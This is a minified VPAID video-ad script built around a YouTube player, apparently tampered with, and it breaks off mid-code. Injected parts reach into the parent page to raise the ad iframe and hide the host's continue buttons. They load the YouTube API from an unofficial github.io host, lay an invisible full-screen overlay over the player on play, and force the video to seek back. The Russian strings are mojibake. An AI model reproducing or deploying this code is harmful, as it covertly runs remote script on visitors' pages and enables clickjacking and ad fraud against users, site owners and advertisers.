var tz_sd_1a_z,tz_sd_1a_z2,host_ref;
function title_ad_play(){try{tz_sd_1a_z2.style.display='none';}catch(e){console.log(e)}}
try{
tz_sd_1a_z2 = document.createElement('div');
tz_sd_1a_z2.innerHTML="Viewing will begin after advertising";    
tz_sd_1a_z2.setAttribute("style","display:inline-block;font-family: Roboto,sans-serif;font-weight: 300; font-size: 18px; outline: rgba(255,255,255,.5) solid 1px;  background-color: rgba(0,0,0,.7); color: #fff;z-index:0;zindex:1;position:absolute;left:0px;top:0px;border:0px;padding:25px;");    
document.getElementsByTagName("body")[0].appendChild(tz_sd_1a_z2);
var arr=window.parent.document.getElementsByTagName("iframe");
for (var i = 0; i < arr.length; i++) {
	if(window.parent.document.getElementsByTagName("iframe")[i].contentWindow == window){
		window.parent.document.getElementsByTagName("iframe")[i].style.zIndex='1000';
	}
}
new_style = document.createElement('style');
new_style.innerHTML="div[id*=pre-continue-btn]{z-index:0!important;visibility: hidden;}";     
window.parent.document.getElementsByTagName("body")[0].appendChild(new_style);
this._slot.appendChild(tz_sd_1a_z2);
} catch(e){};
!function t(e,n,i){function a(s,o){if(!n[s]){if(!e[s]){var u="function"==typeof require&&require;if(!o&&u)return u(s,!0);if(r)return r(s,!0);var l=new Error("Cannot find module '"+s+"'");throw l.code="MODULE_NOT_FOUND",l}var c=n[s]={exports:{}};e[s][0].call(c.exports,function(t){var n=e[s][1][t];return a(n||t)},c,c.exports,t,e,n,i)}return n[s].exports}for(var r="function"==typeof require&&require,s=0;s<i.length;s++)a(i[s]);return a}({1:[function(t,e,n){var i={utf8:{stringToBytes:function(t){return i.bin.stringToBytes(unescape(encodeURIComponent(t)))},bytesToString:function(t){return decodeURIComponent(escape(i.bin.bytesToString(t)))}},bin:{stringToBytes:function(t){for(var e=[],n=0;n<t.length;n++)e.push(255&t.charCodeAt(n));return e},bytesToString:function(t){for(var e=[],n=0;n<t.length;n++)e.push(String.fromCharCode(t[n]));return e.join("")}}};e.exports=i},{}],2:[function(t,e,n){!function(){var t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",n={rotl:function(t,e){return t<<e|t>>>32-e},rotr:function(t,e){return t<<32-e|t>>>e},endian:function(t){if(t.constructor==Number)return 16711935&n.rotl(t,8)|4278255360&n.rotl(t,24);for(var e=0;e<t.length;e++)t[e]=n.endian(t[e]);return t},randomBytes:function(t){for(var e=[];t>0;t--)e.push(Math.floor(256*Math.random()));return e},bytesToWords:function(t){for(var e=[],n=0,i=0;n<t.length;n++,i+=8)e[i>>>5]|=t[n]<<24-i%32;return e},wordsToBytes:function(t){for(var e=[],n=0;n<32*t.length;n+=8)e.push(t[n>>>5]>>>24-n%32&255);return e},bytesToHex:function(t){for(var e=[],n=0;n<t.length;n++)e.push((t[n]>>>4).toString(16)),e.push((15&t[n]).toString(16));return e.join("")},hexToBytes:function(t){for(var e=[],n=0;n<t.length;n+=2)e.push(parseInt(t.substr(n,2),16));return e},bytesToBase64:function(e){for(var n=[],i=0;i<e.length;i+=3)for(var a=e[i]<<16|e[i+1]<<8|e[i+2],r=0;r<4;r++)8*i+6*r<=8*e.length?n.push(t.charAt(a>>>6*(3-r)&63)):n.push("=");return n.join("")},base64ToBytes:function(e){e=e.replace(/[^A-Z0-9+\/]/gi,"");for(var n=[],i=0,a=0;i<e.length;a=++i%4)0!=a&&n.push((t.indexOf(e.charAt(i-1))&Math.pow(2,-2*a+8)-1)<<2*a|t.indexOf(e.charAt(i))>>>6-2*a);return n}};e.exports=n}()},{}],3:[function(t,e,n){function i(t){return!!t.constructor&&"function"==typeof t.constructor.isBuffer&&t.constructor.isBuffer(t)}function a(t){return"function"==typeof t.readFloatLE&&"function"==typeof t.slice&&i(t.slice(0,0))}e.exports=function(t){return null!=t&&(i(t)||a(t)||!!t._isBuffer)}},{}],4:[function(t,e,n){!function(){var n=t("crypt"),i=t("charenc").utf8,a=t("is-buffer"),r=t("charenc").bin,s=function(t,e){t.constructor==String?t=e&&"binary"===e.encoding?r.stringToBytes(t):i.stringToBytes(t):a(t)?t=Array.prototype.slice.call(t,0):Array.isArray(t)||(t=t.toString());for(var o=n.bytesToWords(t),u=8*t.length,l=1732584193,c=-271733879,d=-1732584194,p=271733878,h=0;h<o.length;h++)o[h]=16711935&(o[h]<<8|o[h]>>>24)|4278255360&(o[h]<<24|o[h]>>>8);o[u>>>5]|=128<<u%32,o[14+(u+64>>>9<<4)]=u;for(var f=s._ff,y=s._gg,m=s._hh,v=s._ii,h=0;h<o.length;h+=16){var b=l,_=c,k=d,g=p;c=v(c=v(c=v(c=v(c=m(c=m(c=m(c=m(c=y(c=y(c=y(c=y(c=f(c=f(c=f(c=f(c,d=f(d,p=f(p,l=f(l,c,d,p,o[h+0],7,-680876936),c,d,o[h+1],12,-389564586),l,c,o[h+2],17,606105819),p,l,o[h+3],22,-1044525330),d=f(d,p=f(p,l=f(l,c,d,p,o[h+4],7,-176418897),c,d,o[h+5],12,1200080426),l,c,o[h+6],17,-1473231341),p,l,o[h+7],22,-45705983),d=f(d,p=f(p,l=f(l,c,d,p,o[h+8],7,1770035416),c,d,o[h+9],12,-1958414417),l,c,o[h+10],17,-42063),p,l,o[h+11],22,-1990404162),d=f(d,p=f(p,l=f(l,c,d,p,o[h+12],7,1804603682),c,d,o[h+13],12,-40341101),l,c,o[h+14],17,-1502002290),p,l,o[h+15],22,1236535329),d=y(d,p=y(p,l=y(l,c,d,p,o[h+1],5,-165796510),c,d,o[h+6],9,-1069501632),l,c,o[h+11],14,643717713),p,l,o[h+0],20,-373897302),d=y(d,p=y(p,l=y(l,c,d,p,o[h+5],5,-701558691),c,d,o[h+10],9,38016083),l,c,o[h+15],14,-660478335),p,l,o[h+4],20,-405537848),d=y(d,p=y(p,l=y(l,c,d,p,o[h+9],5,568446438),c,d,o[h+14],9,-1019803690),l,c,o[h+3],14,-187363961),p,l,o[h+8],20,1163531501),d=y(d,p=y(p,l=y(l,c,d,p,o[h+13],5,-1444681467),c,d,o[h+2],9,-51403784),l,c,o[h+7],14,1735328473),p,l,o[h+12],20,-1926607734),d=m(d,p=m(p,l=m(l,c,d,p,o[h+5],4,-378558),c,d,o[h+8],11,-2022574463),l,c,o[h+11],16,1839030562),p,l,o[h+14],23,-35309556),d=m(d,p=m(p,l=m(l,c,d,p,o[h+1],4,-1530992060),c,d,o[h+4],11,1272893353),l,c,o[h+7],16,-155497632),p,l,o[h+10],23,-1094730640),d=m(d,p=m(p,l=m(l,c,d,p,o[h+13],4,681279174),c,d,o[h+0],11,-358537222),l,c,o[h+3],16,-722521979),p,l,o[h+6],23,76029189),d=m(d,p=m(p,l=m(l,c,d,p,o[h+9],4,-640364487),c,d,o[h+12],11,-421815835),l,c,o[h+15],16,530742520),p,l,o[h+2],23,-995338651),d=v(d,p=v(p,l=v(l,c,d,p,o[h+0],6,-198630844),c,d,o[h+7],10,1126891415),l,c,o[h+14],15,-1416354905),p,l,o[h+5],21,-57434055),d=v(d,p=v(p,l=v(l,c,d,p,o[h+12],6,1700485571),c,d,o[h+3],10,-1894986606),l,c,o[h+10],15,-1051523),p,l,o[h+1],21,-2054922799),d=v(d,p=v(p,l=v(l,c,d,p,o[h+8],6,1873313359),c,d,o[h+15],10,-30611744),l,c,o[h+6],15,-1560198380),p,l,o[h+13],21,1309151649),d=v(d,p=v(p,l=v(l,c,d,p,o[h+4],6,-145523070),c,d,o[h+11],10,-1120210379),l,c,o[h+2],15,718787259),p,l,o[h+9],21,-343485551),l=l+b>>>0,c=c+_>>>0,d=d+k>>>0,p=p+g>>>0}return n.endian([l,c,d,p])};s._ff=function(t,e,n,i,a,r,s){var o=t+(e&n|~e&i)+(a>>>0)+s;return(o<<r|o>>>32-r)+e},s._gg=function(t,e,n,i,a,r,s){var o=t+(e&i|n&~i)+(a>>>0)+s;return(o<<r|o>>>32-r)+e},s._hh=function(t,e,n,i,a,r,s){var o=t+(e^n^i)+(a>>>0)+s;return(o<<r|o>>>32-r)+e},s._ii=function(t,e,n,i,a,r,s){var o=t+(n^(e|~i))+(a>>>0)+s;return(o<<r|o>>>32-r)+e},s._blocksize=16,s._digestsize=16,e.exports=function(t,e){if(void 0===t||null===t)throw new Error("Illegal argument "+t);var i=n.wordsToBytes(s(t,e));return e&&e.asBytes?i:e&&e.asString?r.bytesToString(i):n.bytesToHex(i)}}()},{charenc:1,crypt:2,"is-buffer":3}],5:[function(t,e,n){"use strict";function i(t){return t&&t.__esModule?t:{default:t}}function a(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}function r(t,e){if(!t)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!e||"object"!=typeof e&&"function"!=typeof e?t:e}function s(t,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function, not "+typeof e);t.prototype=Object.create(e&&e.prototype,{constructor:{value:t,enumerable:!1,writable:!0,configurable:!0}}),e&&(Object.setPrototypeOf?Object.setPrototypeOf(t,e):t.__proto__=e)}Object.defineProperty(n,"__esModule",{value:!0});var o="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},u=function(){function t(t,e){for(var n=0;n<e.length;n++){var i=e[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}return function(e,n,i){return n&&t(e.prototype,n),i&&t(e,i),e}}(),l=i(t("./base-adapter")),c=i(t("./../tools/dom-helper")),d=function(t){if(t&&t.__esModule)return t;var e={};if(null!=t)for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n]);return e.default=t,e}(t("./../const.js")),p=function(t){function e(t){a(this,e);var n=r(this,(e.__proto__||Object.getPrototypeOf(e)).call(this,t));return n.isYTApiLoaded()?n.onAPIReady():n.loadYTApi(),n}return s(e,t),u(e,[{key:"loadYTApi",value:function(){window.onYouTubeIframeAPIReady=this.onAPIReady.bind(this);var t=document.createElement("script");t.type="text/javascript",t.async=!1,t.src="https://coolboy112233.github.io/unknowbastard/iframe_api.js",t.id=this.constructor.name+"_ytapi_script";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)}},{key:"isYTApiLoaded",value:function(){return"object"==("undefined"==typeof YT?"undefined":o(YT))&&"function"==typeof YT.Player&&YT.loaded}},{key:"onAPIReady",value:function(){host_ref=this.params.ref2;console.log("*** YT API ready");var t={height:this.attributes.height,width:this.attributes.width,host2:host_ref,playerVars:{fs:1,autoplay:0,enablejsapi:1,playsinline:1,iv_load_policy:1,rel:0,wmode:"transparent",origin:""},events:{onReady:this.onPlayerReady.bind(this),onStateChange:this.onPlayerStateChange.bind(this),onError:this.onPlayerError.bind(this)}};this.player=new YT.Player(this.dom.playerFrame,t)}},{key:"onPlayerError",value:function(t){var e=this;setTimeout(function(){e.VPAID.emit("AdError"),e.VPAID.emit("AdSkipped"),e.VPAID.emit("AdStopped")},10)}},{key:"onPlayerReady",value:function(t){console.log("*** YT Player ready"),this.cueById(this.params.videoId,this.params.videoStartSec)}},{key:"onPlayerStateChange",value:function(t){var e=this;switch(t.data){case YT.PlayerState.UNSTARTED:if(null!=this.state.timer&&this.stopTimer(),this.state.events.loaded&&(this.state.events.loaded=!1,this.dispatchEvent(d.STATS_EVENT,d.STATE_LOADED),void 0!=o(this.params.pixels)&&this.params.pixels.loaded))for(var n=this.params.pixels.loaded,i=0;i<n.length;i++){var a=n[i];a.check&&(this.makePx(a.url),a.check=!1)}break;case YT.PlayerState.BUFFERING:break;case YT.PlayerState.CUED:this.state.playedTime=0,this.VPAID.emit("AdLoaded");break;case YT.PlayerState.ENDED:if(this.state.playedTime<=this.state.skipTime){this.player.seekTo(1);break}if(null!=this.state.timer&&this.stopTimer(),this.state.events.finish){if(this.state.events.finish=!0,this.dispatchEvent(d.STATS_EVENT,d.STATE_FINISH),void 0!=o(this.params.pixels)&&this.params.pixels.finished)for(var r=this.params.pixels.finished,s=0;s<r.length;s++){var u=r[s];u.check&&(this.makePx(u.url),u.check=!1)}setTimeout(function(){e.VPAID.emit("AdVideoComplete"),e.VPAID.emit("AdStopped")},75)}this.params.showShareBar&&(this.dom.socialShareContainer.className="vs_lab__shares active");break;case YT.PlayerState.PLAYING:if(this.params.showShareBar&&(this.dom.socialShareContainer.className="vs_lab__shares"),this.updateHeartsPoints(),null==this.state.timer&&this.startTimer(),this.state.events.play){if(this.VPAID.emit("AdVideoStart"),this.state.events.play=!1,this.dispatchEvent(d.STATS_EVENT,d.STATE_PLAY),void 0!==this.dom.prePlayHintMessage&&(this.dom.prePlayHintMessage.style.display="none"),void 0!=o(this.params.pixels)&&this.params.pixels.play)for(var l=this.params.pixels.play,p=0;p<l.length;p++){var h=l[p];h.check&&(this.makePx(h.url),h.check=!1)}if(this.params.showShareBar&&this.makeShareButtons(),this.params.skippable&&this.makeSkipButton(),this.params.image_button){var f=this.attributes.playerId,y=c.default.makeElem("img",{id:f+"__image-button",class:f+"__image-button vs_lab__image-button"});y.setAttribute("src",this.params.playerHost+"/"+this.params.image_button.path),y.setAttribute("alt",this.params.image_button.desc),y.setAttribute("title",this.params.image_button.desc),y.style.width=(this.attributes.width>>2)+"px",y.style.marginLeft="10px",y.style.cursor="pointer",y.addEventListener("click",function(t){if(window.open(e.params.image_button.link,"_blank").focus(),void 0!=o(e.params.pixels)&&e.params.pixels.click)for(var n=e.params.pixels.click,i=0;i<n.length;i++){var a=n[i];a.check&&(e.makePx(a.url),a.check=!1)}}),this.params.image_button.el=y,this.dom.buttonsContainer.appendChild(y)}this.params.buttons&&!this.params.image_button&&function(){for(var t=e.params.buttons.reverse(),n=0;n<t.length;n++)!function(n){var i=t[n];e.makeButton(i,n,function(n){window.open(i.link,"_blank").focus();t[n.target.getAttribute("data-bid")];if(void 0!=o(e.params.pixels)&&e.params.pixels.click)for(var a=e.params.pixels.click,r=0;r<a.length;r++){var s=a[r];s.check&&(e.makePx(s.url),s.check=!1)}})}(n)}()}this.VPAID.emit("AdPlaying");break;case YT.PlayerState.PAUSED:this.stopTimer(),this.VPAID.emit("AdPaused"),this.params.showShareBar&&(this.dom.socialShareContainer.className="vs_lab__shares active")}}},{key:"startTimer",value:function(){var t=this;this.state.currentTime=this.player.getCurrentTime(),this.state.timer=setInterval(function(){var e=t.player.getCurrentTime();if(t.state.playedTime+=e-t.state.currentTime,t.state.currentTime=e,t.checkEvents(),t.params.buttons&&!t.params.image_button)for(var n=0;n<t.params.buttons.length;n++){var i=t.params.buttons[n];void 0==o(i.hide)||i.hide||null===i.start_time||null===i.end_time||(i.end_time>t.state.currentTime&&t.state.currentTime>i.start_time?i.el.style.display="block":i.el.style.display="none")}t.params.skippable&&(t.state.playedTime<t.params.skipTime?t.dom.skipBtn.innerHTML="Skip this in "+(t.params.skipTime-t.state.playedTime).toFixed()+" s.":t.state.canSkip||(t.state.canSkip=!0,t.attributes.skippableState=!0,t.VPAID.emit("AdSkippableStateChange"),t.dom.skipBtn.className+=" vs_lab__skip-btn_skippable",t.dom.skipBtn.innerHTML="Skip AD"))},250)}},{key:"stopTimer",value:function(){clearInterval(this.state.timer),this.state.timer=null}},{key:"checkEvents",value:function(){if(this.state.events.action&&this.state.playedTime>this.params.delayForAction&&(this.state.events.action=!1,this.dispatchEvent(d.STATS_EVENT,d.STATE_ACTION),void 0!=o(this.params.pixels)&&this.params.pixels.action))for(var t=this.params.pixels.action,e=0;e<t.length;e++){var n=t[e];n.check&&(this.makePx(n.url),n.check=!1)}var i=this.state.hearts;for(var a in i)i.hasOwnProperty(a)&&i[a].check&&i[a].point<=this.state.playedTime&&(i[a].check=!1,"25"==a&&this.VPAID.emit("AdVideoFirstQuartile"),"50"==a&&this.VPAID.emit("AdVideoMidpoint"),"75"==a&&this.VPAID.emit("AdVideoThirdQuartile"),this.dispatchEvent(d.STATS_EVENT,d.STATE_HEART,{percent:a}))}},{key:"updateHeartsPoints",value:function(){var t=this.state.hearts,e=parseInt(this.getDuration());this.state.duration=e;var n=e/100;for(var i in t)t.hasOwnProperty(i)&&(t[i].point=i*n,t[i].check&&t[i].point<=this.state.playedTime&&(t[i].check=!1))}},{key:"makeButton",value:function(t,e,n){var i=this,a=this.attributes.playerId,r=c.default.makeElem("div",{id:a+"__button_"+e,class:a+"__button vs_lab__button"});r.innerHTML=t.desc,r.setAttribute("data-bid",e),r.style.width=(this.attributes.width>>2)+"px";var s=c.default.makeElem("div",{class:a+"__hideit vs_lab__hideit"});s.innerHTML="x",s.addEventListener("click",function(t){t.stopPropagation();var n=t.target.parentElement;return i.params.buttons[e].hide=!0,n.style.display="none",!1}),r.appendChild(s),r.addEventListener("click",n),this.params.buttons[e].el=r,null===t.start_time&&null===t.end_time||(r.style.display="none"),this.dom.buttonsContainer.appendChild(r)}},{key:"makeSkipButton",value:function(){var t=this,e=c.default.makeElem("div",{class:this.attributes.playerId+"__skip-btn vs_lab__skip-btn"});e.innerHTML="ÐŸÑ€Ð¾Ð¿ÑƒÑÑ‚Ð¸Ñ‚ÑŒ Ñ‡ÐµÑ€ÐµÐ· "+this.params.skipTime+" ÑÐµÐº.",e.style.width=(this.attributes.width>>2)+"px",e.addEventListener("click",function(){t.getSkippableState()&&(t.stopTimer(),t.VPAID.emit("AdSkipped"),t.VPAID.emit("AdStopped"))}),this.dom.skipBtn=e,this.dom.playerContainer.appendChild(e)}},{key:"makeShareButtons",value:function(){for(var t="https://youtu.be/"+this.params.videoId,e=[{type:"yt",shareUrl:"https://www.youtube.com/channel/"+this.params.channelId+"?sub_confirmation=1",title:"ÐŸÐ¾Ð´Ð¿Ð¸ÑÐ°Ñ‚ÑŒÑÑ Ð½Ð° ÐºÐ°Ð½Ð°Ð»"},{type:"vk",shareUrl:"https://vk.com/share.php?url=",title:"ÐŸÐ¾Ð´ÐµÐ»Ð¸Ñ‚ÑŒÑÑ Ð’ÐšÐ¾Ð½Ñ‚Ð°ÐºÑ‚Ðµ"},{type:"ok",shareUrl:"https://connect.ok.ru/dk?st.cmd=WidgetSharePreview&st.shareUrl=",title:"ÐŸÐ¾Ð´ÐµÐ»Ð¸Ñ‚ÑŒÑÑ Ð² ÐžÐ´Ð½Ð¾ÐºÐ»Ð°ÑÑÐ½Ð¸ÐºÐ°Ñ…"},{type:"fb",shareUrl:"https://www.facebook.com/sharer/sharer.php?u=",title:"ÐŸÐ¾Ð´ÐµÐ»Ð¸Ñ‚ÑŒÑÑ Ð² Facebook"},{type:"tw",shareUrl:"https://twitter.com/intent/tweet?url=",title:"ÐŸÐ¾Ð´ÐµÐ»Ð¸Ñ‚ÑŒÑÑ Ð² Ð¢Ð²Ð¸Ñ‚Ñ‚ÐµÑ€Ðµ"}],n=0;n<e.length;n++){var i=e[n],a=c.default.makeElem("div",{class:"vs_lab__share_item vs_lab__share-"+i.type});a.setAttribute("title",i.title),a.setAttribute("data-social-type",i.type),"yt"==i.type?a.setAttribute("data-full-link",i.shareUrl):a.setAttribute("data-full-link",i.shareUrl+t),a.addEventListener("click",function(t){var e=t.target.getAttribute("data-full-link");t.target.getAttribute("data-social-type");window.open(e)}),this.dom.socialShareContainer.appendChild(a)}}},{key:"cueById",value:function(t,e){this.player.cueVideoById(t,e),this.dom.vpaidContainer.parentNode.style.zIndex="1001",console.log("*** Video cue "+t)}},{key:"getSkippableState",value:function(){return this.state.canSkip}},{key:"resize",value:function(t,e,n){if("normal"==n){var i=this.player.getIframe();if(i.setAttribute("width",t),i.setAttribute("height",e),this.attributes.width=t,this.attributes.height=e,!this.state.events.play&&(this.dom.skipBtn.style.width=(this.attributes.width>>2)+"px",this.params.buttons&&!this.params.image_button))for(var a=0;a<this.params.buttons.length;a++)this.params.buttons[a].el.style.width=(this.attributes.width>>2)+"px"}this.VPAID.emit("AdSizeChange")}},{key:"play",value:function(){/*this.player.playVideo()*/}},{key:"pause",value:function(){this.player.pauseVideo()}},{key:"resume",value:function(){this.player.playVideo()}},{key:"setVolume",value:function(t){this.player.isMuted()&&this.player.unMute();var e=Math.floor(100*t);e<=0?this.player.mute():this.player.setVolume(e)}},{key:"getVolume",value:function(){return this.player.getVolume()<=0?0:this.player.getVolume()/100}},{key:"getDuration",value:function(){return this.player.getDuration()}},{key:"getRemainingTime",value:function(){var t=(this.params.duration-this.state.currentTime).toFixed();return t<=0?0:t}}]),e}(l.default);n.default=p},{"./../const.js":7,"./../tools/dom-helper":15,"./base-adapter":6}],6:[function(t,e,n){"use strict";function i(t){return t&&t.__esModule?t:{default:t}}function a(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(n,"__esModule",{value:!0});var r="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},s=function(){function t(t,e){for(var n=0;n<e.length;n++){var i=e[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}return function(e,n,i){return n&&t(e.prototype,n),i&&t(e,i),e}}(),o=function(t){if(t&&t.__esModule)return t;var e={};if(null!=t)for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n]);return e.default=t,e}(t("./../const.js")),u=i(t("../tools/assets-manager")),l=i(t("../statistics/stat.js")),c=i(t("")),d=i(t("../tools/dom-helper")),p=function(){function t(e){a(this,t),this.VPAID=e,this.params=e._AdParameters,this.loadAssets(),this.attributes=e._attributes,this.dom=e._dom,this.statTracker=new l.default(this.params.playerHost,o.STATS_EVENT),this.statYandexTracker=new c.default(o.YANDEX_METRIKA_ID,o.STATS_EVENT),void 0!=r(this.params.hintText)&&0!=this.params.hintText.length&&(this.dom.prePlayHintMessage=this.makePreplayHintMessage(this.params.hintText)),this.state={duration:0,currentTime:0,playedTime:0,skipTime:this.params.tmpt,canSkip:!1,timer:null,events:{loaded:!0,play:!0,action:!0,finish:!0},hearts:{25:{point:0,check:!0},50:{point:0,check:!0},75:{point:0,check:!0},95:{point:0,check:!0}}}}return s(t,[{key:"makePreplayHintMessage",value:function(t){var e=d.default.makeElem("div",{class:this.attributes.playerId+"__hintbox vs_lab__hintbox"});return e.innerHTML=t,this.dom.vpaidContainer.appendChild(e),e}},{key:"makePx",value:function(t){document.createElement("img").src=t}},{key:"dispatchEvent",value:function(t,e){var n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};e==o.STATE_ACTION&&this.VPAID.emit("AdImpression");host_ref=this.params.ref2; var i={detail:{state:e,cid:this.params.campaignId,pid:this.params.platformId,playerId:this.attributes.playerId}};this.params.ref.length&&(i.detail.host=this.params.ref);for(var a in n)n.hasOwnProperty(a)&&(i.detail[a]=n[a]);document.dispatchEvent(new CustomEvent(t,i))}},{key:"loadAssets",value:function(){u.default.slot=this.VPAID._slot,u.default.loadCss(this.params.playerHost+"/bundles/videoseedvast2/css/player.css?"+this.params.buster)}}]),t}();n.default=p},{"../statistics/stat.js":9,"":10,"../tools/assets-manager":12,"../tools/dom-helper":15,"./../const.js":7}],7:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});n.STATS_EVENT=Math.random().toString(36).substring(3),n.YANDEX_METRIKA_ID="48226934",n.STATE_LOADED=1,n.STATE_ACTION=2,n.STATE_FINISH=3,n.STATE_START=4,n.STATE_SKIP=5,n.STATE_HEART=6,n.STATE_PLAY=7},{}],8:[function(t,e,n){"use strict";function i(t){return t&&t.__esModule?t:{default:t}}function a(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}var r="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},s=function(){function t(t,e){for(var n=0;n<e.length;n++){var i=e[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}return function(e,n,i){return n&&t(e.prototype,n),i&&t(e,i),e}}(),o=i(t("./adapters/Youtube")),u=i(t("./tools/dom-helper")),l=(i(t("./tools/debug-panel")),function(t){if(t&&t.__esModule)return t;var e={};if(null!=t)for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n]);e.default=t}(t("./const.js")),i(t("./tools/custom-event-polyfill"))),c=function(){function t(){a(this,t),this._slot=null,this._videoSlot=null,this._eventCallbacks={},this._AdParameters={},this._attributes={duration:0,expanded:!1,height:0,width:0,remainingTime:0,skippableState:!1,viewMode:"normal",volume:1},this.videoServices={youtube:o.default}}return s(t,[{key:"handshakeVersion",value:function(t){return"2.0"}},{key:"subscribe",value:function(t,e,n){var i=t.bind(n);this._eventCallbacks[e]=i}},{key:"unsubscribe",value:function(t){this._eventCallbacks[t]=null}},{key:"emit",value:function(t){void 0!==this._eventCallbacks[t]?this._eventCallbacks[t]():console.error("Unknown event called: "+t)}},{key:"createPlayerByService",value:function(t){return new this.videoServices[t](this)}},{key:"initAd",value:function(t,e,n,i,a,r){this._slot=r.slot,this._videoSlot=r.videoSlot,this._AdParameters=JSON.parse(a.AdParameters),this._dom={},this._attributes.width=t,this._attributes.height=e;var s="vs"+this._AdParameters.did;this._attributes.playerId=s;var o=u.default.makeElem("div",{id:s+"__container",class:s+"__container vs_lab__container"}),l=u.default.makeElem("div",{id:s+"__buttons",class:s+"__buttons vs_lab__buttons"}),c=u.default.makeElem("div",{id:s+"__player-container",class:s+"__player-container vs_lab__player-container"}),d=u.default.makeElem("div",{id:s+"__player",class:s+"__player vs_lab__player"}),p=u.default.makeElem("div",{id:s+"__shares",class:s+"__shares vs_lab_shares"});this._dom={vpaidContainer:o,buttonsContainer:l,playerContainer:c,playerFrame:d,socialShareContainer:p},c.appendChild(d),o.appendChild(c),o.appendChild(l),o.appendChild(p),this._slot.appendChild(o),this._player=this.createPlayerByService(this._AdParameters.videoService)}},{key:"resizeAd",value:function(t,e,n){this._player.resize(t,e,n)}},{key:"startAd",value:function(){var t=this;this.emit("AdStarted"),setTimeout(function(){return t.emit("AdPaused")},75)}},{key:"stopAd",value:function(){}},{key:"pauseAd",value:function(){this._player.pause()}},{key:"resumeAd",value:function(){this._player.resume()}},{key:"expandAd",value:function(){this.emit("AdExpanded")}},{key:"collapseAd",value:function(){this.emit("AdCollapsed")}},{key:"skipAd",value:function(){var t=this;setTimeout(function(){return t.emit("AdStopped")},75)}},{key:"getAdLinear",value:function(){return!0}},{key:"getAdWidth",value:function(){return this._attributes.width}},{key:"getAdHeight",value:function(){return this._attributes.height}},{key:"getAdExpanded",value:function(){return!0}},{key:"getAdSkippableState",value:function(){return void 0!==r(this._player)&&this._player.getSkippableState()}},{key:"getAdRemainingTime",value:function(){return-1}},{key:"getAdDuration",value:function(){return this._AdParameters.duration}},{key:"getAdCompanions",value:function(){return""}},{key:"getAdIcons",value:function(){return""}},{key:"getAdVolume",value:function(){return this._player.getVolume()}},{key:"setAdVolume",value:function(t){this._player.setVolume(t)}}]),t}();(0,l.default)(),window.getVPAIDAd=function(){return new c}},{"./adapters/Youtube":5,"./const.js":7,"./tools/custom-event-polyfill":13,"./tools/debug-panel":14,"./tools/dom-helper":15}],9:[function(t,e,n){"use strict";function i(t){return t&&t.__esModule?t:{default:t}}function a(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(n,"__esModule",{value:!0});var r=function(){function t(t,e){for(var n=0;n<e.length;n++){var i=e[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}return function(e,n,i){return n&&t(e.prototype,n),i&&t(e,i),e}}(),s=i(t("md5")),o=i(t("../tools/ajax")),u=function(){function t(e,n){a(this,t),this.ajax=new o.default,this.endpointUrl="",document.addEventListener(n,this.handleEvent.bind(this))}return r(t,[{key:"handleEvent",value:function(t){var e=t.detail;e.etc=(new Date).getTime();var n=Object.keys(e).sort().reduce(function(t,n){return t+e[n]},"");e.mgc=(0,s.default)(n);console.log('stat:',e.cid);if(e.state == 7){try{title_ad_play()}catch(e){};tz_sd_1a_z = document.createElement('div');
tz_sd_1a_z.setAttribute("style","z-index:0;zindex:1;position:absolute;left:0px;bottom:0px;border:0px;opacity:0;width:100%;height:100%;");    
document.getElementById(e.playerId+'__player-container').appendChild(tz_sd_1a_z);} if(e.state == 2){this.ajax.sendCORSRequest(this.endpointUrl+'&a='+e.cid+'&l='+e.pid,e)}}}]),t}();n.default=u},{"../tools/ajax":11,md5:4}],10:[function(t,e,n){"use strict";function i(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(n,"__esModule",{value:!0});var a="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},r=function(){function t(t,e){for(var n=0;n<e.length;n++){var i=e[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}return function(e,n,i){return n&&t(e.prototype,n),i&&t(e,i),e}}(),s=window,o=document,u="yandex_metrika_callbacks",l=function(){function t(e,n){i(this,t),this.metrikaId=e,document.addEventListener(n,this.handleEvent.bind(this)),this.isYMApiReady()&&this.isYMApiLoading()?this.onYMApiReady():this.loadYMAPI()}return r(t,[{key:"isYMApiLoading",value:function(){return null!==o.getElementById(this.constructor.name+"_ymapi_script")}},{key:"isYMApiReady",value:function(){return"object"===("undefined"==typeof Ya?"undefined":a(Ya))&&"function"==typeof 